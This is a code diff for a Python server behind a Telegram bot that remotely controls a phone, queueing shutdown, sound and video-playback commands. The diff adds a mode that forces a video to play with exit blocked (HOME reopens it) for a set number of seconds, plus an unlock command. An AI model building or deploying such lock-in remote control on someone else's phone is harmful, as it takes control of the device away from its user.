@@ -1,4 +1,4 @@
-from fastapi import FastAPI, Header, HTTPException
+from fastapi import FastAPI, Header, HTTPException, Request
 from typing import Optional
 import os
 import asyncio
@@ -13,7 +13,9 @@ state = {
     "pending_commands": [],
     "last_seen": None,
     "command_callbacks": {},
-    "raw_links": [],  # [{id, url, added}]
+    "raw_links": [],
+    # Сессия выбора параметров видео: {chat_id: {step, video_cmd, video_num/url}}
+    "video_sessions": {},
 }
 
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
@@ -39,15 +41,29 @@ async def startup():
     asyncio.create_task(keep_alive())
 
 
-async def send_tg(chat_id: str, text: str):
+async def send_tg(chat_id: str, text: str, reply_markup=None):
     if not BOT_TOKEN:
         return
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
+    if reply_markup:
+        payload["reply_markup"] = reply_markup
     try:
         async with httpx.AsyncClient(timeout=10) as client:
-            await client.post(url, json={"chat_id": chat_id, "text": text, "parse_mode": "Markdown"})
+            await client.post(url, json=payload)
     except Exception as e:
         print(f"send_tg error: {e}")
+
+
+async def answer_callback(callback_query_id: str, text: str = ""):
+    if not BOT_TOKEN:
+        return
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
+    try:
+        async with httpx.AsyncClient(timeout=10) as client:
+            await client.post(url, json={"callback_query_id": callback_query_id, "text": text})
+    except Exception as e:
+        print(f"answer_callback error: {e}")
 
 
 def phone_online() -> bool:
@@ -67,20 +83,18 @@ def last_seen_str() -> str:
 
 async def enqueue_command(chat_id: str, cmd: dict, description: str):
     if not phone_online():
-        await send_tg(chat_id, f"⚠️ Телефон оффлайн (последний ping: {last_seen_str()})\nКоманда добавлена в очередь — выполнится когда телефон появится.")
+        await send_tg(chat_id, f"⚠️ Телефон оффлайн (последний ping: {last_seen_str()})\nКоманда добавлена в очередь.")
     else:
-        await send_tg(chat_id, f"📡 Телефон онлайн (ping: {last_seen_str()})\nОтправляю команду...")
+        await send_tg(chat_id, f"📡 Отправляю команду...")
 
     cmd_id = str(uuid.uuid4())[:8]
     cmd["_id"] = cmd_id
     state["pending_commands"].append(cmd)
     state["command_callbacks"][cmd_id] = chat_id
-
-    await send_tg(chat_id, f"✅ Команда `{description}` в очереди (ID: `{cmd_id}`)\nЖду подтверждения от телефона...")
+    await send_tg(chat_id, f"✅ Команда `{description}` в очереди (ID: `{cmd_id}`)")
 
 
 def normalize_google_drive_url(url: str) -> str:
-    """Преобразует ссылку Google Drive в прямую ссылку для скачивания."""
     if "drive.google.com/file/d/" in url:
         try:
             file_id = url.split("/file/d/")[1].split("/")[0]
@@ -90,7 +104,69 @@ def normalize_google_drive_url(url: str) -> str:
     return url
 
 
+def video_lock_keyboard():
+    """Inline кнопки: заблокировать выход или нет"""
+    return {
+        "inline_keyboard": [
+            [
+                {"text": "🔓 Без блокировки", "callback_data": "vlock_no"},
+                {"text": "🔒 Заблокировать выход", "callback_data": "vlock_yes"},
+            ]
+        ]
+    }
+
+
+async def start_video_flow(chat_id: str, video_cmd: str, video_num: int = 0, video_url: str = ""):
+    """Начинаем диалог выбора параметров видео"""
+    state["video_sessions"][chat_id] = {
+        "step": "lock",          # lock → duration → done
+        "video_cmd": video_cmd,  # "video" или "play_raw"
+        "video_num": video_num,
+        "video_url": video_url,
+        "lock": False,
+        "duration": 0,
+    }
+    name = f"video{video_num}" if video_num else "raw видео"
+    await send_tg(
+        chat_id,
+        f"🎬 *{name}*\n\nЗаблокировать выход из видео?\n_(кнопка HOME будет снова открывать видео)_",
+        reply_markup=video_lock_keyboard()
+    )
+
+
+async def process_callback(callback: dict):
+    chat_id = str(callback["message"]["chat"]["id"])
+    data = callback.get("data", "")
+    cb_id = callback["id"]
+
+    if ALLOWED_CHAT_ID and chat_id != ALLOWED_CHAT_ID:
+        await answer_callback(cb_id, "⛔ Нет доступа")
+        return
+
+    session = state["video_sessions"].get(chat_id)
+    if not session:
+        await answer_callback(cb_id, "Сессия устарела, начни заново")
+        return
+
+    if data == "vlock_no":
+        await answer_callback(cb_id, "🔓 Без блокировки")
+        session["lock"] = False
+        session["step"] = "duration"
+        await send_tg(chat_id, "⏱ Сколько секунд обязательно смотреть?\n_(0 = без ограничения, можно закрыть сразу)_")
+
+    elif data == "vlock_yes":
+        await answer_callback(cb_id, "🔒 Блокировка включена")
+        session["lock"] = True
+        session["step"] = "duration"
+        await send_tg(chat_id, "⏱ Сколько секунд обязательно смотреть?\n_(0 = смотреть до конца видео, выйти нельзя пока не кончится)_")
+
+
 async def process_update(update: dict):
+    # Callback от inline кнопок
+    if "callback_query" in update:
+        await process_callback(update["callback_query"])
+        return
+
     msg = update.get("message") or update.get("edited_message")
     if not msg:
         return
@@ -102,6 +178,38 @@ async def process_update(update: dict):
         await send_tg(chat_id, "⛔ Нет доступа.")
         return
 
+    # Если идёт сессия выбора параметров видео
+    session = state["video_sessions"].get(chat_id)
+    if session and session["step"] == "duration":
+        if not text.isdigit():
+            await send_tg(chat_id, "⚠️ Введи число секунд (например: 30) или 0")
+            return
+        duration = int(text)
+        session["duration"] = duration
+        session["step"] = "done"
+        state["video_sessions"].pop(chat_id, None)
+
+        lock_str = "🔒 заблокирован" if session["lock"] else "🔓 без блокировки"
+        dur_str = f"{duration} сек" if duration > 0 else ("до конца видео" if session["lock"] else "сразу")
+
+        await send_tg(chat_id, f"✅ Запускаю видео\nВыход: {lock_str}\nОбязательное время: {dur_str}")
+
+        cmd = {
+            "cmd": session["video_cmd"],
+            "lock": session["lock"],
+            "duration": duration,
+        }
+        if session["video_cmd"] == "video":
+            cmd["num"] = session["video_num"]
+            desc = f"video{session['video_num']}"
+        else:
+            cmd["url"] = session["video_url"]
+            desc = "raw видео"
+
+        await enqueue_command(chat_id, cmd, desc)
+        return
+
+    # Обычные команды
     if text in ("/start", "/help"):
         await send_tg(chat_id, (
             "📱 *Phone Control Bot*\n\n"
@@ -121,20 +229,20 @@ async def process_update(update: dict):
             "/addraw <url> — добавить ссылку на видео\n"
             "/lists — список сохранённых ссылок\n"
             "/raw <номер> — воспроизвести по номеру\n"
-            "/delvideo <номер> — удалить ссылку и кэш с телефона\n\n"
-            "💡 Для Google Drive: Поделиться → Все у кого есть ссылка → скопируй URL"
+            "/delvideo <номер> — удалить ссылку и кэш\n"
+            "/unbanvideo — разблокировать выход из видео"
         ))
 
     elif text == "/on":
         state["active"] = True
         state["pending_commands"] = []
-        online = "🟢 онлайн" if phone_online() else f"🔴 оффлайн (последний ping: {last_seen_str()})"
-        await send_tg(chat_id, f"✅ Режим управления *включён*\nТелефон: {online}\nPolling каждые 10 сек.")
+        online = "🟢 онлайн" if phone_online() else f"🔴 оффлайн (ping: {last_seen_str()})"
+        await send_tg(chat_id, f"✅ Режим управления *включён*\nТелефон: {online}")
 
     elif text == "/off":
         state["active"] = False
         state["pending_commands"] = []
-        await send_tg(chat_id, "🔕 Режим управления *выключен*. Очередь команд очищена.")
+        await send_tg(chat_id, "🔕 Режим управления *выключен*.")
 
     elif text == "/shutdown":
         if not state["active"]:
@@ -175,7 +283,7 @@ async def process_update(update: dict):
             await send_tg(chat_id, "⚠️ Сначала включи режим командой /on")
         else:
             num = int(text[-1])
-            await enqueue_command(chat_id, {"cmd": "video", "num": num}, f"встроенное video{num}")
+            await start_video_flow(chat_id, "video", video_num=num)
 
     elif text.startswith("/sound"):
         if not state["active"]:
@@ -191,14 +299,10 @@ async def process_update(update: dict):
     elif text.startswith("/addraw "):
         url = text[8:].strip()
         if not url.startswith("http"):
-            await send_tg(chat_id, "⚠️ Некорректная ссылка. Должна начинаться с http")
+            await send_tg(chat_id, "⚠️ Некорректная ссылка.")
             return
         url = normalize_google_drive_url(url)
-        entry = {
-            "id": str(uuid.uuid4())[:6],
-            "url": url,
-            "added": datetime.now().strftime("%d.%m %H:%M")
-        }
+        entry = {"id": str(uuid.uuid4())[:6], "url": url, "added": datetime.now().strftime("%d.%m %H:%M")}
         state["raw_links"].append(entry)
         num = len(state["raw_links"])
         preview = url[:60] + "..." if len(url) > 60 else url
@@ -206,7 +310,7 @@ async def process_update(update: dict):
 
     elif text == "/lists":
         if not state["raw_links"]:
-            await send_tg(chat_id, "📭 Список ссылок пуст. Добавь через /addraw <url>")
+            await send_tg(chat_id, "📭 Список пуст. Добавь через /addraw <url>")
             return
         lines = ["📋 *Список видео по ссылкам:*\n"]
         for i, entry in enumerate(state["raw_links"], 1):
@@ -225,10 +329,10 @@ async def process_update(update: dict):
             return
         num = int(parts[1])
         if num < 1 or num > len(state["raw_links"]):
-            await send_tg(chat_id, f"⚠️ Нет ссылки с номером {num}. Посмотри /lists")
+            await send_tg(chat_id, f"⚠️ Нет ссылки с номером {num}.")
             return
         entry = state["raw_links"][num - 1]
-        await enqueue_command(chat_id, {"cmd": "play_raw", "url": entry["url"]}, f"воспроизвести raw {num}")
+        await start_video_flow(chat_id, "play_raw", video_url=entry["url"])
 
     elif text.startswith("/delvideo "):
         parts = text.split()
@@ -237,14 +341,18 @@ async def process_update(update: dict):
             return
         num = int(parts[1])
         if num < 1 or num > len(state["raw_links"]):
-            await send_tg(chat_id, f"⚠️ Нет ссылки с номером {num}. Посмотри /lists")
+            await send_tg(chat_id, f"⚠️ Нет ссылки с номером {num}.")
             return
         entry = state["raw_links"].pop(num - 1)
         if state["active"]:
             await enqueue_command(chat_id, {"cmd": "delete_video", "url": entry["url"]}, f"удалить кэш видео {num}")
-            await send_tg(chat_id, f"🗑 Ссылка {num} удалена из списка и кэш отправлен на удаление с телефона.")
+        await send_tg(chat_id, f"🗑 Ссылка {num} удалена.")
+
+    elif text == "/unbanvideo":
+        if not state["active"]:
+            await send_tg(chat_id, "⚠️ Сначала включи режим командой /on")
         else:
-            await send_tg(chat_id, f"🗑 Ссылка {num} удалена из списка.\n⚠️ Телефон оффлайн — кэш удалится при следующем подключении автоматически.")
+            await enqueue_command(chat_id, {"cmd": "unban_video"}, "разблокировать выход из видео")
 
     elif text == "/status":
         online = "🟢 Онлайн" if phone_online() else "🔴 Оффлайн"
@@ -271,17 +379,14 @@ async def webhook(update: dict):
 async def poll(x_device_secret: Optional[str] = Header(None)):
     if x_device_secret != DEVICE_SECRET:
         raise HTTPException(status_code=403, detail="Forbidden")
-
     state["last_seen"] = datetime.now()
-
     if state["pending_commands"]:
         cmd = state["pending_commands"].pop(0)
         cmd_id = cmd.get("_id")
         if cmd_id and cmd_id in state["command_callbacks"]:
             chat_id = state["command_callbacks"].pop(cmd_id)
-            asyncio.create_task(send_tg(chat_id, f"📲 Телефон получил команду `{cmd.get('cmd')}` (ID: `{cmd_id}`) и выполняет её."))
+            asyncio.create_task(send_tg(chat_id, f"📲 Телефон получил команду `{cmd.get('cmd')}` и выполняет."))
         return {"active": state["active"], "command": cmd}
-
     return {"active": state["active"], "command": None}
 
 
